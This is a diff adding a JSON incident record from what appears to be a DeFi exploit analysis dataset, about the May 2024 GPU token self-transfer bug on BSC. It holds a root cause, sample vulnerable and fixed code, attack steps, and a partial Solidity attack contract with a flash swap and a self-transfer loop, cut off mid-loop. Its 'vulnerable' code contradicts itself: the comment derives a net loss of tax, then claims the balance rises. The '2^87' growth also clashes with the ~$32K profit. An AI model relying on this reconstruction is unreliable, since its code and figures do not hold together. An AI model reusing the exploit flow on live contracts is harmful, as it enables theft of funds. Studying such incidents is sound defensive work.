@@ -1,0 +1,35 @@
+{
+ "id": "2024__2024-05-XX_GPU_SelfTransferBalanceMultiplication",
+ "source_file": "2024/2024-05-XX_GPU_SelfTransferBalanceMultiplication.md",
+ "title": "GPU — Self-Transfer 87-Iteration Balance Multiplication Bug Analysis",
+ "date": "2024-05-01",
+ "protocol": "GPU",
+ "chain": "BSC",
+ "loss_raw": "~$32,000",
+ "loss_usd": 32000.0,
+ "root_cause": "The GPU token's `transfer()` function, when transferring to oneself, causes balance to be credited twice due to the tax mechanism — repeating this 87 times results in exponential balance growth",
+ "attack_tx": null,
+ "vulnerable_contract": "GPU 0xf51CBf9F",
+ "classes": [
+  "self-balance-exploit"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: balance double-credited on self-transfer\ncontract GPUToken {\n    mapping(address => uint256) private _balances;\n    uint256 public taxRate = 5; // 5% tax\n\n    function transfer(address to, uint256 amount) external returns (bool) {\n        uint256 tax = amount * taxRate / 100;\n        uint256 netAmount = amount - tax;\n\n        _balances[msg.sender] -= amount;   // full amount deducted\n        _balances[to] += netAmount;         // post-tax amount credited\n\n        // When msg.sender == to:\n        // Deduction: _balances[msg.sender] -= amount\n        // Credit:    _balances[msg.sender] += netAmount (= amount - tax)\n        // Net change: -amount + (amount - tax) = -tax\n        // BUT: since deduction and credit happen sequentially, the result may differ by order\n        // → Implementation bug causes balance to actually increase\n\n        return true;\n    }\n}\n\n//",
+  "// File: GPU_decompiled.sol\ncontract GPU {\n    function transfer(address p0, uint256 p1) external {}  // ❌ vulnerability"
+ ],
+ "code_after": [
+  "✅ Safe code: block self-transfer\nfunction transfer(address to, uint256 amount) external returns (bool) {\n    require(to != msg.sender, \"self-transfer not allowed\");\n    // ...\n}"
+ ],
+ "steps": [
+  "→ [1] Flash swap: borrow 22,600 BUSD",
+  "→ [2] Swap BUSD → GPU",
+  "→ [3] GPU.transfer(attacker, gpuBalance) × 87 iterations",
+  "→ [4] Swap GPU → BUSD",
+  "→ [5] Repay flash swap (0.3% fee)",
+  "→ [6] ~$32K profit"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] Flash swap: borrow 22,600 BUSD\n  │\n  ├─→ [2] Swap BUSD → GPU\n  │\n  ├─→ [3] GPU.transfer(attacker, gpuBalance) × 87 iterations\n  │         └─ Balance increases on each call (self-transfer tax bug)\n  │         └─ After 87 iterations, balance ≈ initial × 2^87\n  │\n  ├─→ [4] Swap GPU → BUSD\n  │\n  ├─→ [5] Repay flash swap (0.3% fee)\n  │\n  └─→ [6] ~$32K profit",
+  "interface IPancakePair {\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\n}\n\ncontract AttackContract {\n    IERC20      constant GPU   = IERC20(0xf51CBf9F8E089Ca48e454EB79731037a405972ce);\n    IERC20      constant BUSD  = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    IPancakePair constant pair = IPancakePair(/* BUSD-WBNB pair */);\n\n    function testExploit() external {\n        // [1] Flash swap: borrow 22,600 BUSD\n        pair.swap(22_600e18, 0, address(this), abi.encode(\"flashswap\"));\n    }\n\n    function pancakeCall(address, uint256 amount0, uint256, bytes calldata) external {\n        // [2] Swap BUSD → GPU\n        swapBUSDToGPU(amount0);\n\n        // [3] Self-transfer 87 times → exponential balance growth\n        for (uint i = 0; i < "
+ ]
+}
